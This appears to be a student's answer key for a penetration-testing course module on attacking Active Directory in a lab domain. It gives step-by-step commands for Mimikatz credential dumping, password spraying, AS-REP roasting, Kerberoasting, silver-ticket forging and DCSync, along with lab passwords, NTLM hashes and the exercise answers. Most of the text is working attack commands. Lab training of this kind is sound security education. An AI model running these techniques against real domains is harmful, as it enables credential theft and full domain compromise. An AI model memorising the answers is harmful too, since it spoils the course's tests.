# 22.1.1
1. What is the name of the cryptographic hash function a computer calculates from the user's password?
```bash
Answer: NTLM hash
```

2. What kind of hashing algorithm is NTLM?
```bash
Answer: fast-hashing
```

# 22.1.2

1. What is the name of the request sent when a user logs into their AD-joined machine?
```bash
Answer: AS-REQ
```

2. What is the main authentication protocol used by Active Directory?
```bash
Answer: Kerberos
```

3. What is the short name of the request sent by the client that encrypts the TGT along with the current user, the target resource, and the timestamp?
```bash
Answer: TGS-REQ
```

# 22.1.3
1. Follow the steps outlined in this section to retrieve the cached NTLM hash. Furthermore, execute the _dir_ command and list the cached tickets. What is the Mimikatz command to dump hashes for all users logged on to the current system?
```bash
xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.210.75
run powershell as admin
cd C:\Tools
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

Answer: sekurlsa::logonpasswords
```

# 22.2.1
1. Follow the steps outlined in this section and spray the password _Nexus123!_ with the three different tools introduced in this section. What is the minimum password length required in the target domain?
```bash
net accounts
Answer: 7
```

2. Spray the credentials of _pete_ against all domain joined machines with crackmapexec. On which machine is _pete_ a local administrator?
```bash
crackmapexec smb 192.168.210.70-76 -u 'pete' -p 'Nexus123!' -d corp.com --continue-on-success
Answer: CLIENT76
```

# 22.2.2

1. Follow the steps outlined in this section to obtain the plaintext password of _dave_ on Windows and Kali by performing AS-REP Roasting. What is the correct Hashcat mode to crack AS-REP hashes?
```bash
Answer: 18200
```

2. Once VM Group 2 is started, the domain _corp.com_ has been slightly modified. Use the techniques from this section to obtain another plaintext password by performing AS-REP Roasting and enter it as answer to this exercise.
```bash
impacket-GetNPUsers -dc-ip 192.168.224.70  -request -outputfile hashes.asreproast corp.com/pete
Nexus123!
hashcat --help | grep -i "Kerberos"
sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Answer: Summerland1
```

# 22.2.3

1. Follow the steps outlined in this section to obtain the plaintext password of _iis_service_ on Windows and Kali by performing Kerberoasting. What is the correct Hashcat mode to crack TGS-REP hashes?
```bash
Answer: 13100
```

2. Once VM Group 2 is started, the domain _corp.com_ has been slightly modified. Use the techniques from this section to obtain another plaintext password by performing Kerberoasting and enter it as answer to this exercise. To crack the TGS-REP hash, create and utilize a rule file which adds a "1" to the passwords of **rockyou.txt**. To perform the attack, you can use the user _jeff_ with the password **HenchmanPutridBonbon11**.
```bash
mkdir /home/kali/shared
xfreerdp /u:jeff /p:"HenchmanPutridBonbon11" /v:192.168.224.75 /drive:Shared,/home/kali/shared
sudo hashcat -m 13100 /home/kali/shared/hashes.kerberoast /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

Answer: MattLovesAutumn1
```

# 22.2.4
1. Follow the steps outlined in this section to forge a silver ticket for _jeffadmin_ in order to access the web page located at **http://web04**. Review the source code of the page and find the flag.
```bash
xfreerdp /u:jeff /p:"HenchmanPutridBonbon11" /v:192.168.224.75 /drive:Shared,/home/kali/shared
iwr -UseDefaultCredentials http://web04
cd ..\..\Tools\  
.\mimikatz.exe 
privilege::debug
sekurlsa::logonpasswords
look for Username: iis_service
look NTLM hash: 4d28cf5252d39971419580a51484ca09
on another powershell window> whoami /user and get SID S-1-5-21-1987370270-658905905-1781884369-1105
on mimikatz power shell > kerberos::golden /sid:S-1-5-21-1987370270-658905905-1781884369 /domain:corp.com /ptt /target:web04.corp.com /service:http /rc4:4d28cf5252d39971419580a51484ca09 /user:jeffadmin
exit
klist
iwr -UseDefaultCredentials http://web04
(iwr -UseDefaultCredentials http://web04).Content | findstr /i "OS{"
get the flag
```

# 22.2.5
1. Follow the steps outlined in this section to perform the dcsync attack to obtain the NTLM hash of the _krbtgt_ account. Enter the NTLM hash as answer to this question.
```bash
powershell
cd C:\Tools\
.\mimikatz.exe
lsadump::dcsync /user:corp\dave
get ntlm hash
store in kali file hashes.dcsync
hashcat -m 1000 hashes.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
at windows > lsadump::dcsync /user:corp\Administrator
impacket-secretsdump -just-dc-user dave corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.214.70
impacket-secretsdump -just-dc-user krbtgt corp.com/jeffadmin:"BrouhahaTungPerorateBroom2023\!"@192.168.214.70
get the hash 
Answer: 1693c6cefafffc7af11ef34d1c788f47
```

2. **Capstone Exercise**: Once VM Group 2 is started, the domain _corp.com_ has been modified. Use the techniques from this Module to obtain access to the user account _maria_ and log in to the domain controller. To perform the initial enumeration steps you can use _pete_ with the password _Nexus123!_. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, create and utilize a rule file which adds nothing, a "1", or a "!" to the passwords of **rockyou.txt**.
```bash
impacket-GetNPUsers -dc-ip 192.168.214.70  -request -outputfile hashes.asreproast corp.com/pete
nano maria.rule
:
$1
$!
 sudo hashcat -m 18200 hashes.asreproast /usr/share/wordlists/rockyou.txt -r ./maria.rule --force
xfreerdp /u:mike /p:"Darkness1099\!" /v:192.168.214.75
cd C:\Tools
.\mimikatz.exe
privilege::debug
sekurlsa::logonpasswords

maria NTLM
2a944a58d4ffa77137b2c587e6ed7626 

echo "2a944a58d4ffa77137b2c587e6ed7626" >> hash_maria.dcsync 
hashcat -m 1000 hash_maria.dcsync /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force

get output 2a944a58d4ffa77137b2c587e6ed7626:passwordt_1415 

xfreerdp /u:maria /p:"passwordt_1415" /v:192.168.214.70 /cert-ignore /d:corp.com
PS C:\Windows\system32> cd ../../../                                             PS C:\> cd .\Users\Administrator\Desktop\                                        PS C:\Users\Administrator\Desktop> ls    
PS C:\Users\Administrator\Desktop> cat .\flag.txt 
```

Answer: 

3. **Capstone Exercise**: Once VM Group 3 is started, the domain _corp.com_ has been modified. By examining leaked password database sites, you discovered that the password _VimForPowerShell123!_ was previously used by a domain user. Spray this password against the domain users _meg_ and _backupuser_. Once you have identified a valid set of credentials, use the techniques from this Module to obtain access to the domain controller. You'll find the flag on the Desktop of the domain administrator on DC1. If you obtain a hash to crack, reuse the rule file from the previous exercise.